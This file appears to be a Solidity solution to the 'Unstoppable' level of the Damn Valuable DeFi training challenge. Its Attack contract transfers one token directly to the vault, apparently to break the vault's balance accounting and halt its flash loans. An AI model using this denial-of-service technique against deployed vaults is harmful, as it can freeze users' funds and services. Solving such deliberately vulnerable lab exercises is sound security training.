//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import 'src/DamnValuableToken.sol';
import 'src/Unstoppable/UnstoppableVault.sol';
contract Attack{
    uint256 constant SEND_VALUE= 1;
    function attack(DamnValuableToken token, UnstoppableVault vault)external{
        token.transfer(address(vault), SEND_VALUE);
    }
}